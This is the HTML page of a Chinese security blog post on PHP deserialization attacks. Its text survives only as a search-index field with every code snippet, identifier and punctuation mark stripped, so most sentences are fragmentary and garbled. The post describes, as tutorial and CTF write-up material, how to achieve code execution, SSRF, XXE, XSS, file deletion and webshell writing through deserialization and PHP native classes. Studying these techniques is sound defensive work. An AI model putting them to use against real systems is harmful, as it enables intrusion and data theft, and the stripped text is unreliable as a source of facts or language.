<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>浅析反序列化 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="浅析反序列化"><meta name="application-name" content="浅析反序列化"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="浅析反序列化"><meta property="og:url" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="PHP反序列化 0x01 简介 什么是序列化？ 对象转换成字符串 为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等 什么是反序列化？ 字符串转换成对象 php序列化和反序列化的函数： 序列化：serialize() 反序列化：unserialize() tip：对字"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="PHP反序列化 0x01 简介 什么是序列化？ 对象转换成字符串 为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等 什么是反序列化？ 字符串转换成对象 php序列化和反序列化的函数： 序列化：serialize() 反序列化：unserialize() tip：对字"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '浅析反序列化',
  postAI: '',
  pageFillDescription: 'PHP反序列化, 0x01 简介, 0X02 为何要 PHP 的序列化和反序列化, 0x03 常见的序列化格式, 0x04 案例, 0x05 访问控制修饰符, 0x06 PHP-反序列化, 6.1 常见的PHP魔术方法, 6.2 漏洞成因, 6.3 序列化引擎, 0x07 反序列化绕过小Trick, 7.1 php7.1+反序列化对类属性不敏感, 7.2 绕过__wakeup, 7.3 绕过部分正则, 7.4 利用引用, 7.5 16进制绕过字符的过滤, 7.6 PHP反序列化字符逃逸, 0x08 对象注入, 0x09 POP链简单介绍, 0x10 PHP原生类反序列化利用, 10.1 Error/Exception 内置类进行 XSS, Error 内置类, Exception 内置类, 10.2 Error/Exception 内置类绕过哈希比较, Error 类, Exception 类, 10.3 SoapClient 类进行 SSRF, SoapClient 类, 10.4 SimpleXMLElement 类进行 XXE, SimpleXMLElement 类, 10.5 ZipArchive 类来删除文件, ZipArchive 类, 10.6 遍历目录类, DirectoryIterator 类, FilesystemIterator 类, GlobIterator 类, 使用可遍历目录类绕过 open_basedir, 10.7 可读取文件类, SplFileObject 类, 10.8 反射类Reflection, ReflectionMethod 类获取类方法的相关信息, ReflectionClass类读取类的属性和方法名, ReflectionFunction类写Webshell, 0x11 Phar反序列化, 11.1 什么是phar文件, 11.2 phar文件的结构, 11.3 漏洞利用条件, 11.4 受影响的函数：, 11.5 绕过方式, 11.6 从 PHP 源码探索 phar 利用成功的深层原因, 1. PHP 流的概念, 2. 流封装协议（wrapper）, 2.1 , 2.2 file//流封装协议, 3. 开始向下挖掘, 0x12 php-session反序列化, 12.1 session简单介绍, 12.2 session 的存储机制, 12.3 session文件创建的几个tip, 12.4 PHP session工作流程, 12.5 php.ini中一些session配置, 12.6 不同的引擎来处理session文件, 1. php处理器, 2. php_binary处理器, 3. php_serialize 处理器, 4. session的反序列化漏洞利用, 12.7 CVE-2016-7124, 漏洞分析, 防御方法：反序列化简介什么是序列化对象转换成字符串为什么转换持久保存方便网络传输例如缓存等什么是反序列化字符串转换成对象序列化和反序列化的函数序列化反序列化对字符串进行序列化后是它本身源码因此直接即可为何要的序列化和反序列化看到这里肯定会有人问这个问题如果说是为了传递数据的方便性那么的序列化又是为了什么呢当然传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性那么序列化除了这种属性以外还有什么特性呢要是只是这样那干脆不如直接用好了当然有从上面的实验中你没发现吗我们把一个实例化的对象长久地存储在了计算机的磁盘上无论什么时候调用都能恢复原来的样子这其实是为了解决对象传递的一个问题因为文件在执行结束以后就会将对象销毁那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策总不能你永远不让它销毁等着你吧于是人们就想出了一种能长久保存对象的方法这就是的序列化那当我们下次要用的时候只要反序列化一下就啦是不是很方便常见的序列化格式二进制格式字节数组字符串字符串案例数组序列化结果表示有两个属性表示型数据表示下标表示字符串数组长度为解析对象序列化结果注序列化后的内容只有成员变量没有成员函数还有一种成员变量就是类型如果是类型会在变量名前加上类名如果是类型则会加上这些都是不可见字符输出则会导致不可见字符的丢失结果如果需要本地存储推荐序列化函数首先我创一个类里面写了三个属性后创建了一个对象将类里的信息进行了改变如果后面还要用到这个对象就可以先将这个对象进行实例化用的时候在反序列化出来就了函数会检查类中是否存在一个魔术方法如果存在方法会先被调用然后才执行序列化操作可以在方法里决定哪些属性可以被序列化如果没有方法则默认序列化所有属性实例即方法使属性序列化而并没有被序列化所以可以在方法里决定哪些属性被序列化访问控制修饰符根据访问控制修饰符的不同序列化后的属性长度和属性值会有所不同所以这里简单提一下公有受保护属性名私有的类名属性名属性被序列化的时候属性值会变成属性名属性被序列化的时候属性值会变成类名属性名为空白符空字符也有长度一个空字符长度为实例实例化一个对象输出结果可以看到前后出现两个空白符一个空白符长度为所以序列化后该属性长度为类名前后出现两个空白符所以长度为反序列化常见的魔术方法类的构造函数当一个对象创建时被调用反序列化不触发类的析构函数但如果程序报错或者抛出异常就不会触发该魔术方法在对象中调用一个不可访问方法时调用在静态上下文中调用一个不可访问的方法时调用读取不可访问属性的值时调用在给不可访问属性赋值时调用当对不可访问属性调用和时被调用当对不可访问属性调用时会被调用执行时先会调用这个函数执行时先会调用这个函数类被当成字符串时的回应方法当尝试以调用函数的方式调用一个对象时方法会被自动调用当调用导出类时此静态方法会被调用当对象复制完成时调用当转储对象以获取应显示的属性时会被调用尝试加载未定义的类执行时先会调用这个函数这个和的区别后面会详细介绍执行时先会调用这个函数这个和的区别后面会详细介绍反序列化函数反序列化就是将一个序列化了的对象或数组字符串还原回去与序列化函数类似会检查类中是否存在一个魔术方法如果存在则会先调用方法再进行序列化可以在方法中对属性进行初始化赋值或者改变反序列化之前重新给属性赋值输出结果漏洞成因原理未对用户输入的序列化字符串进行检测导致攻击者可以控制反序列化过程从而导致代码执行注入目录遍历等不可控后果在反序列化的过程中自动触发了某些魔术方法漏洞触发条件函数的参数变量可控文件中存在可利用的类类中有魔术方法而在反序列化时如果反序列化对象中存在魔法函数使用函数同时也会触发这样一旦我们能够控制入口那么就可能引发对象注入漏洞序列化引擎对的处理有三种引擎分别为经过这三者处理后的结构都不相同与函数序列化后的结果一致后的结果键名的长度对应的字符键名函数序列化的值默认使用引擎使用引擎的结果使用引擎的结果使用引擎的结果如下其中存在不可见字符将结果进行编码如下在文件可写的情况下可手动写入我们想要的内容例如该题目中可任意文件写入故写入文件构造简单说一下和拼接在一起后变为经序列化引擎反序列化后就成为了反序列化绕过小反序列化对类属性不敏感我们前面说了如果变量前是序列化结果会在变量名前加上但在特定版本以上则对于类属性不敏感比如下面的例子即使没有也依然会输出绕过版本利用方式序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过的执行例如果执行输出结果为而把对象属性个数的值增大执行输出结果为绕过部分正则正则表达式描述了一种字符串匹配的模式可以用来检查一个串是否含有某种子串将匹配的子串替换或者从某个串中取出符合某个条件的子串等匹配序列化字符串是否是对象字符串开头号可以实现绕过号代表空格另外反序列化在遇到号时也会自动退出反序列化进程利用加号绕过在传参时注意编码为为要反序列化的对象序列化结果开头是不影响作为数组元素的的析构号绕过对应编写脚本绕过主要是调用执行命令函数获取利用引用上面这个例子将设置为的引用可以使永远与相等对应于脚本代码进制绕过字符的过滤可以写成表示字符类型的大写时会被当成进制解析进制十进制你绕不过未作处理前做处理后是的进制反序列化字符逃逸过滤后字符变多反序列化后的一个替换成为两个反序列化字符串过滤后此时正常输出如下添加一个看看这个就是将传入的中的改为了正常传入不含的值就会正常显示例如此时长度为如果我们传入正常情况下他的长度就是但是经过函数的替换变成了导致溢出长度大于进而影响下面的反序列化我们可以利用这一点来实现字符串逃逸构造输出如下解释当我们构造时在后写个而且后面也是的长度在进行时这里的个就变成了个刚好符合序列化时的长度从而造成溢出前面的闭合前串后面的闭合反序列化的全过程而先前存在的被舍弃因为这里数组只有两个元素不影响反序列化的过程总之变量被我们控制过滤后字符变少把反序列化后的两个替换成为一个反序列化字符串过滤后此时构造这里的个经过滤后就变为了个但是在前面的长度还是所以后面的个字符被吃掉注意这一部分本来就有后面的为我们所构造的被我们控制脚本对象注入对象注入当用户的请求在传给反序列化函数之前没有被正确的过滤时就会产生漏洞因为允许对象序列化攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的函数最终导致一个在该应用范围内的任意对象注入前提需要满足两个条件的参数可控代码里有定义一个含有魔术方法的类并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数脚本结束时会调用函数同时会覆盖变量输出链简单介绍前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞因为自动调用而触发漏洞但如果关键代码不在魔术方法中而是在一个类的普通方法中这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来简单案例当尝试将对象调用为函数时触发把类当作字符串使用时触发当调用一个不存在的或者是无法访问的属性的时候被调用共有个类反序列化会调用存在于类中的可控也就是中变量可控思路将构造成一个对象当为一个对象时就会执行类中的此时将指向类取类中的值使这个值自动调用此时将构造成表示将当作函数返回当类变量直接当作函数调用的时候就会调用魔术方法然后将构造成读取源码即可来自原生类反序列化利用我们可以使用以下方法遍历一下的内置类返回由已定义类的名字所组成的数组返回由类的方法名组成的数组可以根据题目环境将指定的方法添加进来来遍历存在指定方法的原生类其中常遇到的几个原生类有内置类进行内置类适用于版本在开启报错的情况下类是的一个内置类用于自动自定义一个在的环境下可能会造成一个漏洞因为它内置有一个的方法常用于反序列化中如果有个链走到一半就走不通了不如尝试利用这个来做一个其实我看到的还是有好一些会选择直接使用的写法我们都知道当把对象当成字符串的时候它就会自动调用这个方法而它会将以字符串的形式表达出来那么假如有一个将它输出出来而输出内容如果是我们可以控制的那我们就可以用标签来执行代码了这里可以看到是一个反序列化函数但是没有让我们进行反序列化的类啊这就遇到了一个反序列化但没有链的情况所以只能找到内置类来进行反序列化输出标签直接被嵌入了进去那里面的内容自然就会被当成代码执行咯类和类类似用法原理都差不多这里就不赘述了只不过类无论是在还是的环境下都能使用内置类适用于版本开启报错的情况下输出之光不知道为何里面这道题没了只好看着别人的说一次进入题目首先通过泄露拿到源码仅看到一个反序列化函数并没有给出需要反序列化的类这就遇到了一个反序列化但没有链的情况所以只能找内置类来进行反序列化又发现有个没得跑了就是我们刚才演示的利用或内置类进行但是查看一下题目的环境发现是所以我们要使用类由于此题是所以只要执行就能把带出来所以如下输出执行后得到就在中内置类绕过哈希比较类是所有内部错误类的基类该类是在中开始引入的类摘要属性方法类属性错误消息内容错误代码抛出错误的文件名抛出错误在该文件中的行数类方法初始化对象获取错误信息返回先前的获取错误代码获取错误发生时的文件获取错误发生时的行号获取调用栈获取字符串形式的调用栈的字符串表达克隆类是所有异常的基类该类是在中开始引入的类摘要属性方法类属性异常消息内容异常代码抛出异常的文件名抛出异常在该文件中的行号类方法异常构造函数获取异常消息内容返回异常链中的前一个异常获取异常代码创建异常时的程序文件名称获取创建的异常所在文件中的行号获取异常追踪信息获取字符串类型的异常追踪信息将异常对象转换为字符串异常克隆我们可以看到在和这两个原生类中内都有方法这个方法用于将异常或错误对象转换为字符串我们以为例我们看看当触发他的方法时会发生什么输出发现这将会以字符串的形式输出当前报错包含当前的错误信息以及当前报错的行号而传入中的错误代码则没有输出出来在来看看下一个例子输出可见和这两个错误对象本身是不同的但是方法返回的结果是相同的注意这里之所以需要在同一行是因为返回的数据包含当前行号类与的使用和结果完全一样只不过类适用于和而只适用于和类的这一点在绕过在类中的哈希比较时很有用极客大挑战我们可以将题目代码中的和分别声明为类似上面的内置类的对象让这两个对象本身不同传入的错误代码即可但是方法输出的结果相同即可由于题目用过滤了小括号无法调用函数所以我们尝试直接将包含进来即可由于过滤了引号我们直接用取反绕过即可这里说一下取反编码取反绕过适用版本无限制当时可以直接利用取反构造实际上利用链如下这里解释以下为什么要闭合掉因为前面可能会有一些报错的信息所以可以先闭合掉前面的东西然后再来包含后面的是取反因为在链里面所以需要用到解码不用编码绕不过去正则里面是因为刷题多了都在根目录下面不在的话正能一步步尝试类进行类简单对象访问协议是连接服务或客户端和服务之间的接口其采用作为底层通讯协议作为数据传送的格式仅限于协议消息基本上是从发送端到接收端的单向传输但它们常常结合起来执行类似于请求应答的模式如果想要使用类需要在配置文件里面开启选项类摘要方法可以看到该内置类有一个方法当方法被触发后它可以发送和请求正是这个方法使得类可以被我们运用在中这个类也算是目前被挖掘出来最好用的一个内置类该类的构造函数如下第一个参数是用来指明是否是模式将该值设为则表示非模式第二个参数为一个数组如果在模式下此参数可选如果在非模式下则必须设置和选项其中是要将请求发送到的服务器的而是服务的目标命名空间使用类进行知道上述两个参数的含义后就很容易构造出的利用了我们可以设置第一个参数为然后第二个参数的选项设置为随便调用对象中不存在的方法触发方法进行首先在上起一个监听然后再执行上述代码就能够成功发送请求这里不知为何我开启不了这个类先看个思路但是由于它仅限于协议所以用处不是很大而如果这里头部还存在漏洞的话但我们则可以通过插入任意的头如下测试代码我们在头中插入一个随便调用对象中不存在的方法触发方法进行执行代码后如下图所示成功在头中插入了一个我们自定义的插入的利用协议去攻击随便调用对象中不存在的方法触发方法进行执行代码后如下图所示成功插入了命令这里就是命令这样我们就可以利用协议去攻击了对于如何发送的数据包这里面还有一个坑就是的设置因为我们要提交的是数据所以的值我们要设置为这里如何修改的值呢由于在的下面所以我们可以通过来设置将原来的挤下去从而再插入一个新的随便调用对象中不存在的方法触发方法进行执行代码后成功发送数据题目给了源码跟着复现一波扫一下目录这里说说明了需要本地地址访问才能输出变量覆盖首先我们看到第一个函数里面个参数我们都可控因此想到用函数进行变量覆盖先用看一下的内容这里能实现步骤为赋值为接着传参在第一个第一个函数中函数多了一个变量即由于函数的特性函数内部实际上为于是形成随后赋值为在第二个函数中构成了输出参数中变量的相关信息反序列化于是我们想通过函数来构造来改变序列化时的处理器从而使其和反序列化时处理引擎不同但是这个函数不接受数组中需要设置参数传输所以用即传入来改变处理器因为中如果提供参数那么会用其中的项目覆盖会话配置指示中的配置项即构造就行了我们可以利用题目中的函数传入实现的调用来修改此页面的序列化引擎为类的利用中的类可以创建数据报文与接口进行交互该内置类有一个方法当方法被触发后它可以发送和请求正是这个方法使得类可以被我们运用在中这个类也算是目前被挖掘出来最好用的一个内置类其中数组下有个选项我们可以利用该选项来自定义而在协议中与是用两个分隔的浏览器就是根据这两个来取出内容并显示出来所以一旦我们能够控制消息头中的字符注入一些恶意的换行这样我们就能注入一些会话或者代码其中有两个必备参数是要将请求发送到的服务器的是服务的目标命名空间我们将设置为即本地文件这个条件满足了中要求的随便填就好其中是我们用来定义利用同时传入页面的使保存到指定中注意传入的时候在前面加了一个符号由于序列化与反序列化处理引擎不一样反序列化时的引擎为会将看做键值分隔符将其后面的内容直接反序列化也就是在你要解析文件时他会将你后面的内容反序列化利用序列化传入后并用反序列化处理后此时中包含了一个键名和一个对象但此时还不会触发需要触发方法来造成该方法在访问对象中一个不存在的方法时会被自动调用所以单纯反序列化还不行我们还需要访问该对象中一个不存在的方法这里就用到了如下这段代码我们可以利用函数将变量覆盖为这样就成了函数有一个特性就是当只传入一个数组时可以用来调用一个类里面的方法会将这个数组中的第一个值当做类名第二个值当做方法名下面我们用将覆盖成就是所以我们传入最后的就变成了即因为对象中没有这个方法就会调用魔术方法从而发送请求造成去访问如上图访问之后自动发送了请求访问文件此时反序列化引擎会反序列化你之前输入的内容于是成功绕过本地地址访问的限制于是变量存入然后我们接着访问页面会输出文件的内容回显这一步由于会触发请求因此会等待很久类进行类这个内置类用于解析文档中的元素官方文档中对于类的构造方法的定义如下其中值得注意的是和这两个参数格式正确的字符串或者文档的路径或如果为默认情况下为使用指定的路径或到一个文件而不是字符串数据可以看到通过设置第三个参数为我们可以实现远程文件的载入第二个参数的常量值我们设置为即可第一个参数就是我们自己设置的的地址即用于引入的外部实体的这样的话当我们可以控制目标调用的类的时候便可以通过这个内置类来构造实现了引用外部实体同理我们可以让上面代码中的中的内容放到自己的中然后在新建类对象的时候第一个参数写的是地址去实现文件的远程载入这样也能实现题目分析先注册账号登陆作业平台看到一个计算器类有两个按钮一个用于调用类实现两位数的四则运算另一个用于提交代码点击按钮观察返回的结果和再根据类里面的内容不难判断得知这里通过传参去调用类然后剩下个变量是函数中参数类的使用首先我们在上构造如下这两个文件然后在中构造如下然后我们就可以看日志这个作者也是埋坑呢这里他用的协议我们改成即可解码得到源码二次注入中限制了只能是说明只能通过去触发这里根据获取数据库中的然后进行操作但没有对值进行过滤导致二次注入再看一下中的上传文件部分首先他会判断是否存在如果不存在就会插入数据库这里没有用单引号保护但是用了进行转义而我们要插入二次注入的语句必须得有单引号这个时候就可以用编码进行绕过因为函数中会输出错误所以我们用函数进行报错注入构造数据库可以识别进制并解码编码之后由于报错的字符数有限制需要用再输出一次编码之后修改上传成功之后再利用类进行也就是访问之后查看访问日志将得到的结果解码之后即可注意由于分了次上传因此两次的文件名字需要不一样才行这里不知道为啥一直实现不了就看个思路吧类来删除文件类类是的一个原生类它是在之后引入的类可以对文件进行压缩与解压缩处理下面列举几个常见的类方法添加一个新的文件目录将文件添加到指定压缩包中添加新的文件同时将内容添加进去关闭将压缩包解压打开一个压缩包删除压缩包中的某一个文件如代表删除第一个文件删除压缩包中的某一个文件名称同时也将文件删除我们来重点看看方法该方法用来打开一个新的或现有的存档以进行读取写入或修改要打开的存档的文件名用于打开档案的模式有以下几种模式总是以一个新的压缩包开始此模式下如果已经存在则会被覆盖或删除如果不存在则创建一个压缩包只读模式打开压缩包如果压缩包已经存在则出错对压缩包执行额外的一致性检查如果失败则显示错误注意如果设置参数的值为的话可以把指定文件删除这里我们跟进方法可以看到也就是将定义为了常量我们在调用时也可以直接将赋值为也就是说我们可以利用原生类调用方法删除目标主机上的文件总是以一个新的压缩包开始此模式下如果已经存在则会被覆盖因为没有保存所以效果就是删除了梦里花开牡丹亭找了半天没找到复现环境就跟着走一遍吧进入题目给出源码当没读取成功时才能得到这是一道反序列化题目但是前面加了一个简单的特性数组绕过哈希比较由于和函数都无法处理数组因此传入一个数组会返回因此这里可以绕过需要两个不同的数但是其哈希值要相等利用读文件我们可以看到类里面的方法当文件存在的时候会执行而调用这个类方法是在类里面的方法而调用类的方法的是类里面的内置方法因此我们就能够找到一条完整的利用链了自己大概也打通了不错得到执行读取到的源码编码果然啊复现的时候发现原来是没创建导致代码走不通利用类删除文件联合里面的类当没读取成功时才能得到可知我们只要使读取失败就可以进入来执行系统命令所以我们应该要想办法将这个文件删除这样就会读取失败才能执行我们的命令刚好我们的类里面也有一个方法如果设置参数的值为的话可以把指定文件删除这里我们跟进方法可以看到也就是将定义为了常量我们在调用时也可以直接将赋值为所以我们利用原生类调用方法即可将即可将删除得到执行之后即可删除注意我这里在本地复现的时候需要把目录文件夹的所有权和分组都给到才能成功删除文件我这里是将文件夹权限设置为即可命令执行绕过黑名单和字符数限制最后一步就是执行我们的命令去读回过头来看我们的这里首先限制了我们的命令长度要小于个字符然后字符里面不能有黑名单字符出现这里我们绕过的方法很多举个例得到这里估计是文件位置放的不对我总是读不到遍历目录类类类提供了一个用于查看文件系统目录内容的简单接口该类的构造方法将会创建一个指定目录的迭代器类摘要方法以字符串形式获取文件名利用类遍历指定目录里的文件如果我们这样会创建一个指定目录的迭代器当执行到函数时会触发类中的方法输出指定目录里面经过排序之后的第一个文件名也可以配合协议使用模式匹配来寻找我们想要的文件路径协议用来查找匹配的文件路径模式如果想输出全部的文件名我们还需要对对象进行遍历类类与类相同提供了一个用于查看文件系统目录内容的简单接口该类的构造方法将会创建一个指定目录的迭代器该类的使用方法与类也是基本相同的类与前两个类的作用相似类也可以遍历一个文件目录使用方法与前两个类也基本相似但与上面略不同的是其行为类似于可以通过模式匹配来寻找文件路径类摘要方法继承的方法我们知道向下面这样在单纯的使用类和类且没有配合协议进行匹配的时候其构造函数创建的是一个指定目录的迭代器当我们使用函数输出的时候会触发这两个类中的方法输出指定目录里面特定排序之后的第一个文件名也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的而类便可以帮我们在一定程度上解决了这个问题由于类支持直接通过模式匹配来寻找文件路径也就是说假设我们知道一个文件名的一部分我们可以通过该类的模式匹配找到其完整的文件名例如我们在中知道在根目录但是我们不知道文件的完整文件名我们就可以通过类似使用可遍历目录类绕过类或者类与协议结合将无视对目录的限制可以用来列举出指定目录下的文件不加也可因为可以自动调用一句话的形式使用类同理而使用类支持直接通过模式匹配来寻找文件路径所以我们就不用在配合协议了不加也可因为可以自动调用一句话的形式可读取文件类类类为单个文件的信息提供了一个高级的面向对象的接口可以用于对文件内容的遍历查找操作等详情请参考该类的构造方法可以构造一个新的文件对象用于后续的读取我们可以像类似下面这样去读取一个文件的一行但是这样也只能读取一行要想全部读取的话还需要对文件中的每一行内容进行遍历进入题目给出源码可以直接绕过方法的执行这是一道反序列化的题目题目里面没有给出什么危险的函数调用因此应该要想到是原生类的利用留意这一段代码可以直接绕过方法的执行我们从反序列化的函数入手看到新建了一个的类对象然后使用类里面的方法对和这两个属性进行检查看是否存在非法的字符没有问题之后就使用语句将新建类返回的内容输出目录遍历类首先利用或类去遍历目标的目录得到执行后得到一个文件夹继续往下找在这个文件夹下找到了文件读取类然后我们使用类读取就行了得到反射类它可以在运行状态中扩展分析程序导出或提取出关于类方法属性参数等的详细信息包括注释这种动态获取的信息以及动态调用对象的方法的功能称为反射类获取类方法的相关信息类报告了一个方法的有关信息类中有很多继承方法可以使用比如这个方法我们可以用它来获取类中各个函数注释内容这是测试方法输出类读取类的属性和方法名类报告了一个类的有关信息其中初始化方法能够返回类的实例既可以是包含类名的字符串也可以是对象用法如下把类里面属性和方法的名字都能够显示出来类写类报告了一个函数的有关信息其中方法能够用来写传递给函数的参数是一个数组像的工作方式我们可以使用这个方法来写红帽杯由于线下是的模式需要挖洞并且修洞直接给出了源码有个文件方法读取文件名从的文件名字里面寻找分析题目首先是页面这里能够让用户填写文件的文件名和内容然后提交提交的文件正常情况下会保存在目录下看一下后台是怎么对文件进行操作的对文件名有字符的进行过滤这里可以目录穿越函数获取文件名字通过分析可以发现我们上传的文件存在目录穿越的问题我们能通过这种方式将文件保存的路径穿越到服务器的任意路径下但是由于存在对文件名字符的过滤因此无法直接传一个文件到网站根目录下执行得另寻僻径无果既然过滤掉了字符意味着这样的修改配置文件意味着行不通但是我想起了另外一个修改配置的文件和一样是对当前目录的所以文件的配置设置即写了和它同目录的文件会优先使用中设置的配置属性但是不是中的每个变量都能通过或者和来设置简单的来说每个变量有它所属于的模式下面官方手册的四个模式通过上表看到模式中提到可以在中设定但实际上只要不是模式下的属性均可以在中设置那配置文件应该怎么写呢这里有官方的配置选项列表配置选项列表在文件上传的题目中我们只需记住这两个选项即可在每个文件头添加上指定文件的内容相当于设置配置的生效时间默认秒于是我们就想是否能够通过上传一个一句话木马文件然后再目录穿越将上传到网站根目录下内容是让其他文件都包含这个一句话木马从而实现但是尝试了很多次都无果由此猜测运行的模式是导致了无法生效类读文件比赛的时候做到这里其实已经没思路了还是题目刷得少啊赛后看有通过类来读文件得思路那先得了解一下类是个什么玩意类为单个文件的信息提供了一个高级的面向对象的接口可以用于对文件内容的遍历查找操作等详情请参考该类的构造方法可以构造一个新的文件对象用于后续的读取我们可以像类似下面这样去读取一个文件的一行输出但是这样也只能读取一行要想全部读取的话还需要对文件中的每一行内容进行遍历反序列化那么我们知道了这个类之后有什么用呢似乎找不到可以用的地方啊想想文件中是不是还有一个文件我们都没用上其中必然藏有解题的关键将带有路径的文件名字作为键文件路径作为值将文件目录作为键作为值这里把文件的名字和路径都存到了里面但是我们能够看到的值是被写死了我们无法控制然后接着往下看将每一个文件的路径赋值给将赋值给相当于文件的路径存在不等于的情况吗将返回的文件名赋值给列表从列表中读取输出文件名我们可以看到这里从数组里面把每一个键文件的路径赋值给将值赋值给然后重点就来了这里用动态调用的方法新建了一个类对象看到这里是不是觉得很奇怪在上一段代码中已经把每一个的值已经写死了为了为什么这里要动态调用而不是直接这种更直接的方式呢这里很明显有问题接着往下看这里又用来判断的值是否是这就更加明显了了的值必然又猫腻看回代码最后是将新建的类对象赋值给一个临时变量然后再通过循环输出每一个值看到这里是不是有点熟悉这不就是类需要循环来输出每一行的值吗于是这里几乎能肯定是通过将的值变成来获取文件的内容既然是读取的内容那我是否能够改变的内容呢结合我们目录穿越的漏洞实际上如果我们知道保存的路径和序列化的方法那么我们实际上可以直接上传一个文件到指定的目录中控制的内容所以最后一个文件就是让我们看保存的路径和序列化方法的接着就是构造我们的序列化后的文件这里的键为对应代码中的值为对应组合起来就是然后文件名需要目录穿越到的值是一个变量并未赋值变